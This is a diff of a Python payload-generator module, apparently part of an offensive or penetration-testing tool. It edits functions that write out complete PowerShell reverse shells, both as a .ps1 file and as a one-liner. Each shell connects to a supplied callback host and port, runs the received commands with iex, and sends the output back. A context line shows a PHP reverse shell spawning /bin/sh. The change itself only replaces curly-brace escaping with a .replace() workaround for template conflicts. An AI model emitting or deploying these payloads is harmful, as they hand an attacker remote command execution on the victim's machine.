@@ -88,21 +88,23 @@ $proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
 
 def powershell_shell(callback_host, callback_port):
     """Generate a PowerShell reverse shell"""
+    # Using .replace() to avoid Jinja2/cookiecutter template syntax conflicts with PowerShell's curly braces
     content = f"""$client = New-Object System.Net.Sockets.TCPClient("{callback_host}",{callback_port})
 $stream = $client.GetStream()
-[byte[]]$bytes = 0..65535|%{{0}}
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
+[byte[]]$bytes = 0..65535|%<<<0>>>
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)<<<
     $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
     $sendback = (iex $data 2>&1 | Out-String )
     $sendback2 = $sendback + "PS " + (pwd).Path + "> "
     $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
     $stream.Write($sendbyte,0,$sendbyte.Length)
     $stream.Flush()
-}}
-$client.Close()"""
+>>>
+$client.Close()""".replace('<<<', '{').replace('>>>', '}')
     return _write_shell(content, "powershell", "ps1")
 
 
 def powershell_oneliner(callback_host, callback_port):
     """Return a PowerShell reverse shell one-liner (not written to file)"""
-    return f"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{callback_host}',{callback_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()" """
+    # Using .replace() to avoid Jinja2/cookiecutter template syntax conflicts with PowerShell's curly braces
+    return f"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{callback_host}',{callback_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%<<<0>>>;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)<<<;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()>>>;$client.Close()" """.replace('<<<', '{').replace('>>>', '}')
